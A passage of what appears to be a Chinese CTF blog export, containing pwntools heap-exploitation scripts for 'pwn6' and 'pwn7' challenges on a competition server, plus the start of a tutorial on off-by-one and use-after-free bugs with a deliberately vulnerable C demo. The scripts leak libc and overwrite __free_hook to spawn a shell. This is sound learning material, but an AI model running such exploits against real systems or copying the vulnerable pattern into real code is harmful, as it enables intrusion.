class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">'./pwn6'</span>)</span><br><span class=\"line\">sh = remote(<span class=\"string\">'219.219.61.234'</span>,<span class=\"string\">'10005'</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">'info'</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class=\"line\"><span class=\"comment\">#idx </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(idx,size,content)</span>:</span></span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">'Choice&gt;&gt; '</span>)</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">'1'</span>)</span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">\"index&gt;&gt; \"</span>)</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">'size&gt;&gt; '</span>)</span><br><span class=\"line\"> sh.sendline(str(size))</span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">'name&gt;&gt; '</span>)</span><br><span class=\"line\"> sh.sendline(str(content))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">'Choice&gt;&gt; '</span>)</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">'2'</span>)</span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">\"index&gt;&gt; \"</span>)</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"> <span class=\"comment\">#sh.recvuntil('dele success')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(content))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">'Choice&gt;&gt; '</span>)</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">'5'</span>)</span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">\"index&gt;&gt; \"</span>)</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"><span class=\"comment\">#leave message at bss</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'secret\\n'</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">'aaa'</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'&gt;&gt; '</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">'2'</span>)</span><br><span class=\"line\"><span class=\"comment\">#overwrite</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x130</span>, <span class=\"string\">'aa'</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x88</span>, <span class=\"string\">'aa'</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x88</span>,<span class=\"string\">'aaaaaaa'</span>)<span class=\"comment\">#edit this to ....</span></span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'aaaaaaa\\x0a'</span>)</span><br><span class=\"line\"><span class=\"comment\">#sh.recv(8)</span></span><br><span class=\"line\">libc_base = u64(sh.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>)) - <span class=\"number\">0x3c4ca8</span></span><br><span class=\"line\">free_addr = libc_base + libc.sym[<span class=\"string\">'__free_hook'</span>]</span><br><span class=\"line\">malloc_addr = libc_base + libc.sym[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">log.success(hex(free_addr))</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x98</span>,<span class=\"string\">'aaa'</span>)<span class=\"comment\">#hide on 0</span></span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x98</span>,<span class=\"string\">'aaa'</span>)<span class=\"comment\">#hide on 0</span></span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x98</span>,<span class=\"string\">'aaa'</span>)<span class=\"comment\">#hide on 0</span></span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x98</span>,<span class=\"string\">'aaa'</span>)<span class=\"comment\">#h</span></span><br><span class=\"line\">add(<span class=\"number\">7</span>,<span class=\"number\">0x98</span>,<span class=\"string\">'aaa'</span>)</span><br><span class=\"line\"><span class=\"comment\">#x/30gx 0x602120 </span></span><br><span class=\"line\"><span class=\"comment\">#bss_ptr</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,<span class=\"number\">0x88</span> * <span class=\"string\">'a'</span> + <span class=\"string\">'\\xb1'</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,<span class=\"number\">0x88</span>,<span class=\"string\">'aaa'</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">payload1 = <span class=\"number\">0x20</span> * <span class=\"string\">'a'</span> + <span class=\"string\">'\\x98'</span> + <span class=\"number\">7</span> * <span class=\"string\">'\\x00'</span> + p64(free_addr)</span><br><span class=\"line\">edit(<span class=\"number\">8</span>,payload1)</span><br><span class=\"line\"><span class=\"comment\">#one_addr = libc_base + 0x45226 #0x4527a,0xf0364,0xf1207</span></span><br><span class=\"line\">one_addr = libc_base + <span class=\"number\">0x4527a</span></span><br><span class=\"line\">payload2 = p64(one_addr)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,payload2)</span><br><span class=\"line\">delete(<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n<p>exp2:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./pwn6'</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = elf.process()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">'219.219.61.234'</span>,<span class=\"string\">'10005'</span>)</span><br><span class=\"line\"><span class=\"comment\"># libc = ELF('libc-2.23.so')</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"><span class=\"comment\"># context.log_level = 'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">enter</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">\"important secret\"</span>,<span class=\"string\">\"ld1ng\"</span>)</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">\"&gt;&gt;\"</span>,<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(idx,size,con)</span>:</span></span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'Your Choice&gt;&gt;'</span>,<span class=\"string\">'1'</span>)</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'index&gt;&gt;'</span>,str(idx))</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'size&gt;&gt;'</span>,str(size))</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'name&gt;&gt;'</span>,con)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(idx,con)</span>:</span></span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'Your Choice&gt;&gt;'</span>,<span class=\"string\">'3'</span>)</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'index&gt;&gt;'</span>,str(idx))</span><br><span class=\"line\"> p.sendafter(<span class=\"string\">'name&gt;&gt;'</span>,con)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'Your Choice&gt;&gt;'</span>,<span class=\"string\">'2'</span>)</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'index&gt;&gt;'</span>,str(idx))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'Your Choice&gt;&gt;'</span>,<span class=\"string\">'5'</span>)</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'index&gt;&gt;'</span>,str(idx))</span><br><span class=\"line\">enter()</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">128</span>,<span class=\"string\">\"aaa\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">128</span>,<span class=\"string\">\"bbb\"</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">libc_base = u64(p.recvuntil(<span class=\"string\">'\\x7f'</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>)) - <span class=\"number\">88</span> - <span class=\"number\">0x10</span> -libc.sym[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">info(hex(libc_base))</span><br><span class=\"line\">sys = libc_base + libc.sym[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">info(hex(sys))</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x88</span>,<span class=\"string\">\"ccc\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x88</span>,<span class=\"string\">\"ddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x88</span>,<span class=\"string\">\"eee\"</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">'a'</span>*<span class=\"number\">0x88</span> + <span class=\"string\">'\\xd1'</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0xc8</span>,<span class=\"string\">\"fff\"</span>)</span><br><span class=\"line\">edit(<span class=\"number\">5</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">16</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">0x88</span>)+p64(<span class=\"number\">0x602080</span>)+p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"ls\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># add(6,0x80,\"ld1ng\")</span></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p64(sys))</span><br><span class=\"line\"><span class=\"comment\">#p.sendline(\"ls\")</span></span><br><span class=\"line\"><span class=\"comment\">#p.sendline(\"cat flag\")</span></span><br><span class=\"line\"><span class=\"comment\"># delete(4)</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN7-fail\"><a href=\"#PWN7-fail\" class=\"headerlink\" title=\"PWN7(fail)\"></a>PWN7(fail)</h2><p>&gt;<br>&gt;<br>&gt;</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#encoding: utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = process(\"./pwn7\")</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">'219.219.61.234'</span>,<span class=\"string\">'10050'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(size))</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(content))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"><span class=\"comment\">#step1: 构造出0x200的pre_size</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>):<span class=\"comment\">#用到10个块</span></span><br><span class=\"line\"> add(<span class=\"number\">0x80</span>,<span class=\"string\">'a'</span> * <span class=\"number\">0x80</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">6</span>):<span class=\"comment\">#六个进入tcahce</span></span><br><span class=\"line\"> delete(i)</span><br><span class=\"line\">delete(<span class=\"number\">9</span>)<span class=\"comment\">#防止top_chunk合并</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">6</span>,<span class=\"number\">9</span>):</span><br><span class=\"line\"> delete(i)<span class=\"comment\">#pre_size分别为0x0,0x100,0x200 （这里合并了）</span></span><br><span class=\"line\"><span class=\"comment\">#到这里全部都free掉了，7个在tcache,3个在unsorted_bin</span></span><br><span class=\"line\"><span class=\"comment\">#step2: 把0x100放入tcache 并由块7进入unsorted_bin提供libc</span></span><br><span class=\"line\"><span class=\"comment\">#另外注意一下idx</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">7</span>): <span class=\"comment\">#占满tcache 这里是倒着的 6,5,4,3,2,1，x,x,x,0</span></span><br><span class=\"line\"> add(<span class=\"number\">0x8</span>,p64(i))</span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p64(<span class=\"number\">7</span>)) <span class=\"comment\">#切分unsorted_bin</span></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p64(<span class=\"number\">8</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p64(<span class=\"number\">9</span>)) <span class=\"comment\">#10个分配完毕</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">6</span>): <span class=\"comment\">#这里idx=6没有释放 也就是最上面的</span></span><br><span class=\"line\"> delete(i)</span><br><span class=\"line\">delete(<span class=\"number\">8</span>) <span class=\"comment\">#进入tcache 带着0x100</span></span><br><span class=\"line\">delete(<span class=\"number\">7</span>) <span class=\"comment\">#进入unsorted_bin 提供Libc </span></span><br><span class=\"line\">add(<span class=\"number\">0xf8</span>, p64(<span class=\"number\">0</span>)) <span class=\"comment\">#这次分配的是idx=8的B块， 将C块的inuse位给清了</span></span><br><span class=\"line\">delete(<span class=\"number\">6</span>) <span class=\"comment\">#填满tcache</span></span><br><span class=\"line\">delete(<span class=\"number\">9</span>) <span class=\"comment\">#促使块合并，但块8还在使用</span></span><br><span class=\"line\"><span class=\"comment\">#step3: leak libc</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">7</span>):</span><br><span class=\"line\"> add(<span class=\"number\">0x8</span>, p64(i))</span><br><span class=\"line\">add(<span class=\"number\">0x8</span> ,p64(<span class=\"number\">7</span>))</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'&gt; '</span>)</span><br><span class=\"line\">libc_base = u64(sh.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>)) - <span class=\"number\">0x3ebca0</span></span><br><span class=\"line\">log.success((hex(libc_base)))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">'a'</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">9</span>)</span><br><span class=\"line\">target = libc.symbols[<span class=\"string\">\"__free_hook\"</span>] + libc_base</span><br><span class=\"line\">log.success(hex(target))</span><br><span class=\"line\">sys_addr = libc.symbols[<span class=\"string\">\"system\"</span>] + libc_base</span><br><span class=\"line\">one_addr = libc_base + <span class=\"number\">0x4f432</span> <span class=\"comment\">#0x4f2c5 </span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, p64(target))</span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, p64(one_addr))</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>后面几个堆题有一个上次新生赛的原题，但就是做不出来</p>\n<p>堆的东西还是不太熟悉，我tcl</p>\n<p>马上考试了，先去复习了</p>\n","categories":["wp"],"tags":["WP"]},{"title":"堆漏洞及其利用","url":"https://pz1o.top/2020/12/22/堆漏洞及其利用/","content":"<p>堆基础和堆漏洞还是分开比较好</p>\n<p>这样看着也比较整齐</p>\n<h1 id=\"堆漏洞\"><a href=\"#堆漏洞\" class=\"headerlink\" title=\"堆漏洞\"></a>堆漏洞</h1><h2 id=\"0x01-Off-By-One\"><a href=\"#0x01-Off-By-One\" class=\"headerlink\" title=\"0x01 Off By One\"></a>0x01 Off By One</h2><h3 id=\"1-概念\"><a href=\"#1-概念\" class=\"headerlink\" title=\"1.概念\"></a>1.概念</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。</p>\n<h3 id=\"2-利用思路\"><a href=\"#2-利用思路\" class=\"headerlink\" title=\"2.利用思路\"></a>2.利用思路</h3><p>(1) 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。</p>\n<p>(2) 溢出字节为 NULL 字节：溢出的一个字节恰好覆盖下一堆块的size域的最低位，将PREV_INUSE位置0，这样前块会被认为是 free 块。这时可以选择使用 unlink 方法进行处理(后面将详细介绍)，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。</p>\n<h3 id=\"3-演示\"><a href=\"#3-演示\" class=\"headerlink\" title=\"3.演示\"></a>3.演示</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[<span class=\"number\">40</span>]=<span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *chunk1;</span><br><span class=\"line\">    chunk1=<span class=\"built_in\">malloc</span>(<span class=\"number\">24</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Get Input\"</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);<span class=\"comment\">//断点</span></span><br><span class=\"line\">    gets(<span class=\"built_in\">buffer</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">strlen</span>(<span class=\"built_in\">buffer</span>)==<span class=\"number\">24</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(chunk1,<span class=\"built_in\">buffer</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这个程序的问题在于strlen 在计算长度的时候不会把结束符 ‘\\x00’ 计算在内，但strcpy 在拷贝的时候会把 ‘\\x00’ 也算上，所以就会造成 off by one。</p>\n<p>我们先来调试一下</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219141904042.png\" alt=\"image-20201219141904042\"></p>\n<p>直接看堆情况 分配24字节上面为什么堆size为0x21也就是33字节 这个可以看上面的</p>\n<p>因为它会把下面一个pre_size占用</p>\n<p>输入24个A</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219142302977.png\" alt=\"image-20201219142302977\"></p>\n<p>可以很直观的看到确实是溢出了一个字节</p>\n</blockquote>\n<h2 id=\"0x02-Use-After-Free\"><a href=\"#0x02-Use-After-Free\" class=\"headerlink\" title=\"0x02 Use After Free\"></a>0x02 Use After Free</h2><h3 id=\"1-概念-1\"><a href=\"#1-概念-1\" class=\"headerlink\" title=\"1.概念\"></a>1.概念</h3><p>Use After Free(UAF)即释放后使用漏洞。若堆指针在释放后未置空，形成悬挂指针，当下次访问该指针时，依然能够访问原指针所指向的堆内容，形成漏洞。</p>\n<h3 id=\"2-利用条件\"><a href=\"#2-利用条件\" class=\"headerlink\" title=\"2.利用条件\"></a>2.利用条件</h3><ul>\n<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>\n<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>\n</ul>\n<h3 id=\"3-演示-1\"><a href=\"#3-演示-1\" class=\"headerlink\" title=\"3.演示\"></a>3.演示</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 